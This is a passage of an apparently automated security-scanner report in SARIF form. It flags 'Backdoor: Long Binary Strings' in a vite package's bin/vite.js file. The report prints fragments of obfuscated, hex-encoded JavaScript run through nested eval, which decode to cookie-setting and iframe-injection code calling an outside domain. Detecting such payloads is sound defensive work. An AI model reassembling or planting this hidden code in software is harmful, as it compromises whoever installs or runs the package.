window;\neval(eval(\"[rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x31\\x30\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x31\\x32\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x33\\\"],rihhb[\\\"\\x7a\\x`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000805"
          },
          "message": {
            "text": "Backdoor: Long Binary Strings",
            "id": "BD000805"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/bin/vite.js"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 7003,
                  "endLine": 4,
                  "endColumn": 7431,
                  "snippet": {
                    "text": "\\x39\\x37\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x36\\x32\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x65\\x36\\x35\\x37\\x37\\x32\\x30\\x35\\x32\\x36\\x35\\x36\\x37\\x34\\x35\\x37\\x38\\x37\\x30\\x32\\x38\\x36\\x31\\x32\\x62\\x32\\x37\\x33\\x64\\x32\\x38\\x35\\x62\\x35\\x65\\x33\\x62\\x35\\x64\\x32\\x39\\x37\\x62\\x33\\x31\\x32\\x63\\x37\\x64\\x32\\x37\\x32\\x39\\x33\", \"\\x37\\x61\\x32\\x64\\x36\\x39\\x36\\x65\\x36\\x34\\x36\\x35\\x37\\x38\\x33\\x61\\x33\\x31\\x33\\x30\\x33\\x30\\x33\\x30\\x33\\x62\\x37\\x34\\x36\\x66\\x37\\x30\\x33\\x61\\x32\\x64\\x33\\x31\\x33\\x30\\x33\\x30\\x33\\x30\\x37\\x30\\x37\\x38\\x33\\x62\\x36\\x63\\x36\\x35\\x36\\x36\\x37\\x34\\x33\\x61\\x32\\x64\\x33\\x39\\x33\\x39\\x33\\x39\\x33\\x39\\x37\\x30\\x37\\x38\\x33\\x62\\x32\\x37\\x33\\x65\\x33\\x63\\x36\\x39\\x36\\x36\\x37\\x32\\x36\\x31\\x36\\x64\\x36\\x35\\x32\\x30\\x37\\x33\\x37\\x32\\x36\\x33\\x33\\x64\\x32\\x37\\x32\", \"\\x32\\x38\\x32\\x30\\x37\\x38\\x33\\x33\\x33\\x33\\x36\\x34\\x37\\x31\\x32\\x30\\x32\\x31\\x33\\x64\\x32\\x30\\x32\\x32\\x33\\x34\\x33\\x36\\x33\\x32\\x33\\x33\\x33\\x39\\x33\\x38\\x36\\x32\\x36\\x35\\x33\\x38\\x33\\x39\\x33\\x34\\x33\\x34\\x36\\x33\\x36\\x35\\x33\\x30\\x33\\x36\\x33\\x34\\x33\\x33\\x33\\x38\\x33\\x35\\x36\\x36\\x33\\x31\\x33\\x33\\x33\\x38\\x33\\x32",
                    "rendered": {
                      "text": "\\x39\\x37\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x36\\x32\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x65\\x36\\x35\\x37\\x37\\x32\\x30\\x35\\x32\\x36\\x35\\x36\\x37\\x34\\x35\\x37\\x38\\x37\\x30\\x32\\x38\\x36\\x31\\x32\\x62\\x32\\x37\\x33\\x64\\x32\\x38\\x35\\x62\\x35\\x65\\x33\\x62\\x35\\x64\\x32\\x39\\x37\\x62\\x33\\x31\\x32\\x63\\x37\\x64\\x32\\x37\\x32\\x39\\x33\", \"\\x37\\x61\\x32\\x64\\x36\\x39\\x36\\x65\\x36\\x34\\x36\\x35\\x37\\x38\\x33\\x61\\x33\\x31\\x33\\x30\\x33\\x30\\x33\\x30\\x33\\x62\\x37\\x34\\x36\\x66\\x37\\x30\\x33\\x61\\x32\\x64\\x33\\x31\\x33\\x30\\x33\\x30\\x33\\x30\\x37\\x30\\x37\\x38\\x33\\x62\\x36\\x63\\x36\\x35\\x36\\x36\\x37\\x34\\x33\\x61\\x32\\x64\\x33\\x39\\x33\\x39\\x33\\x39\\x33\\x39\\x37\\x30\\x37\\x38\\x33\\x62\\x32\\x37\\x33\\x65\\x33\\x63\\x36\\x39\\x36\\x36\\x37\\x32\\x36\\x31\\x36\\x64\\x36\\x35\\x32\\x30\\x37\\x33\\x37\\x32\\x36\\x33\\x33\\x64\\x32\\x37\\x32\", \"\\x32\\x38\\x32\\x30\\x37\\x38\\x33\\x33\\x33\\x33\\x36\\x34\\x37\\x31\\x32\\x30\\x32\\x31\\x33\\x64\\x32\\x30\\x32\\x32\\x33\\x34\\x33\\x36\\x33\\x32\\x33\\x33\\x33\\x39\\x33\\x38\\x36\\x32\\x36\\x35\\x33\\x38\\x33\\x39\\x33\\x34\\x33\\x34\\x36\\x33\\x36\\x35\\x33\\x30\\x33\\x36\\x33\\x34\\x33\\x33\\x33\\x38\\x33\\x35\\x36\\x36\\x33\\x31\\x33\\x33\\x33\\x38\\x33\\x32",
                      "markdown": "`\\x39\\x37\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x36\\x32\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x65\\x36\\x35\\x37\\x37\\x32\\x30\\x35\\x32\\x36\\x35\\x36\\x37\\x34\\x35\\x37\\x38\\x37\\x30\\x32\\x38\\x36\\x31\\x32\\x62\\x32\\x37\\x33\\x64\\x32\\x38\\x35\\x62\\x35\\x65\\x33\\x62\\x35\\x64\\x32\\x39\\x37\\x62\\x33\\x31\\x32\\x63\\x37\\x64\\x32\\x37\\x32\\x39\\x33\", \"\\x37\\x61\\x32\\x64\\x36\\x39\\x36\\x65\\x36\\x34\\x36\\x35\\x37\\x38\\x33\\x61\\x33\\x31\\x33\\x30\\x33\\x30\\x33\\x30\\x33\\x62\\x37\\x34\\x36\\x66\\x37\\x30\\x33\\x61\\x32\\x64\\x33\\x31\\x33\\x30\\x33\\x30\\x33\\x30\\x37\\x30\\x37\\x38\\x33\\x62\\x36\\x63\\x36\\x35\\x36\\x36\\x37\\x34\\x33\\x61\\x32\\x64\\x33\\x39\\x33\\x39\\x33\\x39\\x33\\x39\\x37\\x30\\x37\\x38\\x33\\x62\\x32\\x37\\x33\\x65\\x33\\x63\\x36\\x39\\x36\\x36\\x37\\x32\\x36\\x31\\x36\\x64\\x36\\x35\\x32\\x30\\x37\\x33\\x37\\x32\\x36\\x33\\x33\\x64\\x32\\x37\\x32\", \"\\x32\\x38\\x32\\x30\\x37\\x38\\x33\\x33\\x33\\x33\\x36\\x34\\x37\\x31\\x32\\x30\\x32\\x31\\x33\\x64\\x32\\x30\\x32\\x32\\x33\\x34\\x33\\x36\\x33\\x32\\x33\\x33\\x33\\x39\\x33\\x38\\x36\\x32\\x36\\x35\\x33\\x38\\x33\\x39\\x33\\x34\\x33\\x34\\x36\\x33\\x36\\x35\\x33\\x30\\x33\\x36\\x33\\x34\\x33\\x33\\x33\\x38\\x33\\x35\\x36\\x36\\x33\\x31\\x33\\x33\\x33\\x38\\x33\\x32`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000805"
          },
          "message": {
            "text": "Backdoor: Long Binary Strings",
            "id": "BD000805"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/bin/vite.js"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 6571,
                  "endLine": 4,
                  "endColumn": 6999,
                  "snippet": {
                    "text": "\\x32\\x30\\x33\\x64\\x32\\x30\\x32\\x32\\x36\\x38\\x37\\x34\\x37\\x34\\x37\\x30\\x33\\x61\\x32\\x66\\x32\\x66\\x37\\x36\\x37\\x32\\x36\\x66\\x37\\x34\\x32\\x65\\x37\\x33\\x37\\x34\\x36\\x35\\x37\\x32\\x37\\x36\\x36\\x31\\x37\\x30\\x36\\x66\\x36\\x39\\x36\\x64\\x36\\x35\\x36\\x65\\x36\\x39\\x36\\x31\\x36\\x63\\x36\\x35\\x36\\x65\\x36\\x31\\x32\\x65\\x36\\x39\\x36\\x65\", \"\\x36\\x36\\x37\\x35\\x36\\x65\\x36\\x33\\x37\\x34\\x36\\x39\\x36\\x66\\x36\\x65\\x32\\x30\\x37\\x38\\x33\\x33\\x33\\x33\\x36\\x32\\x37\\x31\\x32\\x38\\x36\\x31\\x32\\x39\\x37\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x36\\x32\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x65\\x36\\x35\\x37\\x37\\x32\\x30\\x35\\x32\\x36\\x35\\x36\\x37\\x34\\x35\\x37\\x38\\x37\\x30\\x32\\x38\\x36\\x31\\x32\\x62\\x32\\x37\\x33\\x64\\x32\\x38\\x35\\x62\\x35\\x65\\x33\\x62\\x35\\x64\\x32\\x39\\x37\\x62\\x33\\x31\\x32\\x63\\x37\\x64\\x32\\x37\\x32\\x39\\x33\", \"\\x37\\x61\\x32\\x64\\x36\\x39\\x36\\x65\\x36\\x34\\x36\\x35\\x37\\x38\\x33\\x61\\x33\\x31\\x33\\x30\\x33\\x30\\x33\\x30\\x33\\x62\\x37\\x34\\x36\\x66\\x37\\x30\\x33\\x61\\x32\\x64\\x33\\x31\\x33\\x30\\x33\\x30\\x33\\x30\\x37\\x30\\x37\\x38\\x33\\x62\\x36\\x63\\x36\\x35\\x36\\x36\\x37\\x34\\x33\\x61\\x32\\x64\\x33\\x39\\x33\\x39\\x33\\x39\\x33\\x39\\x37\\x30\\x37\\x38",
                    "rendered": {
                      "text": "\\x32\\x30\\x33\\x64\\x32\\x30\\x32\\x32\\x36\\x38\\x37\\x34\\x37\\x34\\x37\\x30\\x33\\x61\\x32\\x66\\x32\\x66\\x37\\x36\\x37\\x32\\x36\\x66\\x37\\x34\\x32\\x65\\x37\\x33\\x37\\x34\\x36\\x35\\x37\\x32\\x37\\x36\\x36\\x31\\x37\\x30\\x36\\x66\\x36\\x39\\x36\\x64\\x36\\x35\\x36\\x65\\x36\\x39\\x36\\x31\\x36\\x63\\x36\\x35\\x36\\x65\\x36\\x31\\x32\\x65\\x36\\x39\\x36\\x65\", \"\\x36\\x36\\x37\\x35\\x36\\x65\\x36\\x33\\x37\\x34\\x36\\x39\\x36\\x66\\x36\\x65\\x32\\x30\\x37\\x38\\x33\\x33\\x33\\x33\\x36\\x32\\x37\\x31\\x32\\x38\\x36\\x31\\x32\\x39\\x37\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x36\\x32\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x65\\x36\\x35\\x37\\x37\\x32\\x30\\x35\\x32\\x36\\x35\\x36\\x37\\x34\\x35\\x37\\x38\\x37\\x30\\x32\\x38\\x36\\x31\\x32\\x62\\x32\\x37\\x33\\x64\\x32\\x38\\x35\\x62\\x35\\x65\\x33\\x62\\x35\\x64\\x32\\x39\\x37\\x62\\x33\\x31\\x32\\x63\\x37\\x64\\x32\\x37\\x32\\x39\\x33\", \"\\x37\\x61\\x32\\x64\\x36\\x39\\x36\\x65\\x36\\x34\\x36\\x35\\x37\\x38\\x33\\x61\\x33\\x31\\x33\\x30\\x33\\x30\\x33\\x30\\x33\\x62\\x37\\x34\\x36\\x66\\x37\\x30\\x33\\x61\\x32\\x64\\x33\\x31\\x33\\x30\\x33\\x30\\x33\\x30\\x37\\x30\\x37\\x38\\x33\\x62\\x36\\x63\\x36\\x35\\x36\\x36\\x37\\x34\\x33\\x61\\x32\\x64\\x33\\x39\\x33\\x39\\x33\\x39\\x33\\x39\\x37\\x30\\x37\\x38",
                      "markdown": "`\\x32\\x30\\x33\\x64\\x32\\x30\\x32\\x32\\x36\\x38\\x37\\x34\\x37\\x34\\x37\\x30\\x33\\x61\\x32\\x66\\x32\\x66\\x37\\x36\\x37\\x32\\x36\\x66\\x37\\x34\\x32\\x65\\x37\\x33\\x37\\x34\\x36\\x35\\x37\\x32\\x37\\x36\\x36\\x31\\x37\\x30\\x36\\x66\\x36\\x39\\x36\\x64\\x36\\x35\\x36\\x65\\x36\\x39\\x36\\x31\\x36\\x63\\x36\\x35\\x36\\x65\\x36\\x31\\x32\\x65\\x36\\x39\\x36\\x65\", \"\\x36\\x36\\x37\\x35\\x36\\x65\\x36\\x33\\x37\\x34\\x36\\x39\\x36\\x66\\x36\\x65\\x32\\x30\\x37\\x38\\x33\\x33\\x33\\x33\\x36\\x32\\x37\\x31\\x32\\x38\\x36\\x31\\x32\\x39\\x37\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x36\\x32\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x65\\x36\\x35\\x37\\x37\\x32\\x30\\x35\\x32\\x36\\x35\\x36\\x37\\x34\\x35\\x37\\x38\\x37\\x30\\x32\\x38\\x36\\x31\\x32\\x62\\x32\\x37\\x33\\x64\\x32\\x38\\x35\\x62\\x35\\x65\\x33\\x62\\x35\\x64\\x32\\x39\\x37\\x62\\x33\\x31\\x32\\x63\\x37\\x64\\x32\\x37\\x32\\x39\\x33\", \"\\x37\\x61\\x32\\x64\\x36\\x39\\x36\\x65\\x36\\x34\\x36\\x35\\x37\\x38\\x33\\x61\\x33\\x31\\x33\\x30\\x33\\x30\\x33\\x30\\x33\\x62\\x37\\x34\\x36\\x66\\x37\\x30\\x33\\x61\\x32\\x64\\x33\\x31\\x33\\x30\\x33\\x30\\x33\\x30\\x37\\x30\\x37\\x38\\x33\\x62\\x36\\x63\\x36\\x35\\x36\\x36\\x37\\x34\\x33\\x61\\x32\\x64\\x33\\x39\\x33\\x39\\x33\\x39\\x33\\x39\\x37\\x30\\x37\\x38`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000805"
          },
          "message": {
            "text": "Backdoor: Long Binary Strings",
            "id": "BD000805"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/bin/vite.js"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 6139,
                  "endLine": 4,
                  "endColumn": 6567,
                  "snippet": {
                    "text": "\\x31\\x32\\x39\\x33\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x34\\x37\\x31\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36\\x33\\x37\\x32\\x36\\x35\\x36\\x31\\x37\\x34\\x36\\x35\\x34\\x35\\x36\\x63\\x36\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\", \"\\x38\\x32\\x32\\x36\\x34\\x36\\x39\\x37\\x36\\x32\\x32\\x32\\x39\\x33\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x37\\x38\\x33\\x32\\x33\\x32\\x37\\x31\\x37\\x31\\x32\\x30\\x33\\x64\\x32\\x30\\x32\\x32\\x36\\x38\\x37\\x34\\x37\\x34\\x37\\x30\\x33\\x61\\x32\\x66\\x32\\x66\\x37\\x36\\x37\\x32\\x36\\x66\\x37\\x34\\x32\\x65\\x37\\x33\\x37\\x34\\x36\\x35\\x37\\x32\\x37\\x36\\x36\\x31\\x37\\x30\\x36\\x66\\x36\\x39\\x36\\x64\\x36\\x35\\x36\\x65\\x36\\x39\\x36\\x31\\x36\\x63\\x36\\x35\\x36\\x65\\x36\\x31\\x32\\x65\\x36\\x39\\x36\\x65\", \"\\x36\\x36\\x37\\x35\\x36\\x65\\x36\\x33\\x37\\x34\\x36\\x39\\x36\\x66\\x36\\x65\\x32\\x30\\x37\\x38\\x33\\x33\\x33\\x33\\x36\\x32\\x37\\x31\\x32\\x38\\x36\\x31\\x32\\x39\\x37\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x36\\x32\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x65\\x36\\x35\\x37\\x37\\x32\\x30\\x35\\x32\\x36\\x35\\x36\\x37\\x34\\x35\\x37\\x38\\x37\\x30\\x32\\x38",
                    "rendered": {
                      "text": "\\x31\\x32\\x39\\x33\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x34\\x37\\x31\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36\\x33\\x37\\x32\\x36\\x35\\x36\\x31\\x37\\x34\\x36\\x35\\x34\\x35\\x36\\x63\\x36\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\", \"\\x38\\x32\\x32\\x36\\x34\\x36\\x39\\x37\\x36\\x32\\x32\\x32\\x39\\x33\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x37\\x38\\x33\\x32\\x33\\x32\\x37\\x31\\x37\\x31\\x32\\x30\\x33\\x64\\x32\\x30\\x32\\x32\\x36\\x38\\x37\\x34\\x37\\x34\\x37\\x30\\x33\\x61\\x32\\x66\\x32\\x66\\x37\\x36\\x37\\x32\\x36\\x66\\x37\\x34\\x32\\x65\\x37\\x33\\x37\\x34\\x36\\x35\\x37\\x32\\x37\\x36\\x36\\x31\\x37\\x30\\x36\\x66\\x36\\x39\\x36\\x64\\x36\\x35\\x36\\x65\\x36\\x39\\x36\\x31\\x36\\x63\\x36\\x35\\x36\\x65\\x36\\x31\\x32\\x65\\x36\\x39\\x36\\x65\", \"\\x36\\x36\\x37\\x35\\x36\\x65\\x36\\x33\\x37\\x34\\x36\\x39\\x36\\x66\\x36\\x65\\x32\\x30\\x37\\x38\\x33\\x33\\x33\\x33\\x36\\x32\\x37\\x31\\x32\\x38\\x36\\x31\\x32\\x39\\x37\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x36\\x32\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x65\\x36\\x35\\x37\\x37\\x32\\x30\\x35\\x32\\x36\\x35\\x36\\x37\\x34\\x35\\x37\\x38\\x37\\x30\\x32\\x38",
                      "markdown": "`\\x31\\x32\\x39\\x33\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x34\\x37\\x31\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36\\x33\\x37\\x32\\x36\\x35\\x36\\x31\\x37\\x34\\x36\\x35\\x34\\x35\\x36\\x63\\x36\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\", \"\\x38\\x32\\x32\\x36\\x34\\x36\\x39\\x37\\x36\\x32\\x32\\x32\\x39\\x33\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x37\\x38\\x33\\x32\\x33\\x32\\x37\\x31\\x37\\x31\\x32\\x30\\x33\\x64\\x32\\x30\\x32\\x32\\x36\\x38\\x37\\x34\\x37\\x34\\x37\\x30\\x33\\x61\\x32\\x66\\x32\\x66\\x37\\x36\\x37\\x32\\x36\\x66\\x37\\x34\\x32\\x65\\x37\\x33\\x37\\x34\\x36\\x35\\x37\\x32\\x37\\x36\\x36\\x31\\x37\\x30\\x36\\x66\\x36\\x39\\x36\\x64\\x36\\x35\\x36\\x65\\x36\\x39\\x36\\x31\\x36\\x63\\x36\\x35\\x36\\x65\\x36\\x31\\x32\\x65\\x36\\x39\\x36\\x65\", \"\\x36\\x36\\x37\\x35\\x36\\x65\\x36\\x33\\x37\\x34\\x36\\x39\\x36\\x66\\x36\\x65\\x32\\x30\\x37\\x38\\x33\\x33\\x33\\x33\\x36\\x32\\x37\\x31\\x32\\x38\\x36\\x31\\x32\\x39\\x37\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x36\\x32\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x65\\x36\\x35\\x37\\x37\\x32\\x30\\x35\\x32\\x36\\x35\\x36\\x37\\x34\\x35\\x37\\x38\\x37\\x30\\x32\\x38`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000805"
          },
          "message": {
            "text": "Backdoor: Long Binary Strings",
            "id": "BD000805"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/bin/vite.js"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 5707,
                  "endLine": 4,
                  "endColumn": 6135,
                  "snippet": {
                    "text": "\\x36\\x32\\x36\\x32\\x30\\x36\\x32\\x32\\x39\\x32\\x30\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36\\x33\\x36\\x66\\x36\\x66\\x36\\x62\\x36\\x39\\x36\\x35\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x31\\x32\\x62\\x32\\x37\\x33\\x64\\x32\\x37\\x32\\x62\\x36\\x32\\x32\\x62\\x32\\x38\\x36\\x33\\x32\\x30\\x33\\x66\\x32\\x30\\x32\", \"\\x33\\x38\\x33\\x35\\x36\\x36\\x33\\x31\\x33\\x33\\x33\\x38\\x33\\x32\\x33\\x35\\x36\\x32\\x33\\x33\\x33\\x32\\x33\\x32\\x33\\x36\\x36\\x32\\x32\\x32\\x32\\x63\\x33\\x31\\x32\\x39\\x33\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x34\\x37\\x31\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36\\x33\\x37\\x32\\x36\\x35\\x36\\x31\\x37\\x34\\x36\\x35\\x34\\x35\\x36\\x63\\x36\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\", \"\\x38\\x32\\x32\\x36\\x34\\x36\\x39\\x37\\x36\\x32\\x32\\x32\\x39\\x33\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x37\\x38\\x33\\x32\\x33\\x32\\x37\\x31\\x37\\x31\\x32\\x30\\x33\\x64\\x32\\x30\\x32\\x32\\x36\\x38\\x37\\x34\\x37\\x34\\x37\\x30\\x33\\x61\\x32\\x66\\x32\\x66\\x37\\x36\\x37\\x32\\x36\\x66\\x37\\x34\\x32\\x65\\x37\\x33\\x37\\x34\\x36\\x35\\x37\\x32\\x37",
                    "rendered": {
                      "text": "\\x36\\x32\\x36\\x32\\x30\\x36\\x32\\x32\\x39\\x32\\x30\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36\\x33\\x36\\x66\\x36\\x66\\x36\\x62\\x36\\x39\\x36\\x35\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x31\\x32\\x62\\x32\\x37\\x33\\x64\\x32\\x37\\x32\\x62\\x36\\x32\\x32\\x62\\x32\\x38\\x36\\x33\\x32\\x30\\x33\\x66\\x32\\x30\\x32\", \"\\x33\\x38\\x33\\x35\\x36\\x36\\x33\\x31\\x33\\x33\\x33\\x38\\x33\\x32\\x33\\x35\\x36\\x32\\x33\\x33\\x33\\x32\\x33\\x32\\x33\\x36\\x36\\x32\\x32\\x32\\x32\\x63\\x33\\x31\\x32\\x39\\x33\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x34\\x37\\x31\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36\\x33\\x37\\x32\\x36\\x35\\x36\\x31\\x37\\x34\\x36\\x35\\x34\\x35\\x36\\x63\\x36\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\", \"\\x38\\x32\\x32\\x36\\x34\\x36\\x39\\x37\\x36\\x32\\x32\\x32\\x39\\x33\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x37\\x38\\x33\\x32\\x33\\x32\\x37\\x31\\x37\\x31\\x32\\x30\\x33\\x64\\x32\\x30\\x32\\x32\\x36\\x38\\x37\\x34\\x37\\x34\\x37\\x30\\x33\\x61\\x32\\x66\\x32\\x66\\x37\\x36\\x37\\x32\\x36\\x66\\x37\\x34\\x32\\x65\\x37\\x33\\x37\\x34\\x36\\x35\\x37\\x32\\x37",
                      "markdown": "`\\x36\\x32\\x36\\x32\\x30\\x36\\x32\\x32\\x39\\x32\\x30\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36\\x33\\x36\\x66\\x36\\x66\\x36\\x62\\x36\\x39\\x36\\x35\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x31\\x32\\x62\\x32\\x37\\x33\\x64\\x32\\x37\\x32\\x62\\x36\\x32\\x32\\x62\\x32\\x38\\x36\\x33\\x32\\x30\\x33\\x66\\x32\\x30\\x32\", \"\\x33\\x38\\x33\\x35\\x36\\x36\\x33\\x31\\x33\\x33\\x33\\x38\\x33\\x32\\x33\\x35\\x36\\x32\\x33\\x33\\x33\\x32\\x33\\x32\\x33\\x36\\x36\\x32\\x32\\x32\\x32\\x63\\x33\\x31\\x32\\x39\\x33\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x34\\x37\\x31\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36\\x33\\x37\\x32\\x36\\x35\\x36\\x31\\x37\\x34\\x36\\x35\\x34\\x35\\x36\\x63\\x36\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\", \"\\x38\\x32\\x32\\x36\\x34\\x36\\x39\\x37\\x36\\x32\\x32\\x32\\x39\\x33\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x37\\x38\\x33\\x32\\x33\\x32\\x37\\x31\\x37\\x31\\x32\\x30\\x33\\x64\\x32\\x30\\x32\\x32\\x36\\x38\\x37\\x34\\x37\\x34\\x37\\x30\\x33\\x61\\x32\\x66\\x32\\x66\\x37\\x36\\x37\\x32\\x36\\x66\\x37\\x34\\x32\\x65\\x37\\x33\\x37\\x34\\x36\\x35\\x37\\x32\\x37`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000805"
          },
          "message": {
            "text": "Backdoor: Long Binary Strings",
            "id": "BD000805"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/bin/vite.js"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 5275,
                  "endLine": 4,
                  "endColumn": 5703,
                  "snippet": {
                    "text": "\\x36\\x33\\x32\\x39\\x37\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x36\\x34\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x65\\x36\\x35\\x37\\x37\\x32\\x30\\x34\\x34\\x36\\x31\\x37\\x34\\x36\\x35\\x32\\x38\\x32\\x39\\x33\\x62\\x36\\x34\\x32\\x65\\x37\\x33\\x36\\x35\\x37\\x34\\x34\\x34\\x36\\x31\\x37\\x34\\x36\\x35\\x32\\x38\\x36\\x34\\x32\\x65\\x36\\x37\\x36\\x35\\x37\\x34\", \"\\x34\\x34\\x36\\x31\\x37\\x34\\x36\\x35\\x32\\x38\\x32\\x39\\x32\\x62\\x36\\x33\\x32\\x39\\x33\\x62\\x37\\x64\\x36\\x39\\x36\\x36\\x32\\x38\\x36\\x31\\x32\\x30\\x32\\x36\\x32\\x36\\x32\\x30\\x36\\x32\\x32\\x39\\x32\\x30\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36\\x33\\x36\\x66\\x36\\x66\\x36\\x62\\x36\\x39\\x36\\x35\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x31\\x32\\x62\\x32\\x37\\x33\\x64\\x32\\x37\\x32\\x62\\x36\\x32\\x32\\x62\\x32\\x38\\x36\\x33\\x32\\x30\\x33\\x66\\x32\\x30\\x32\", 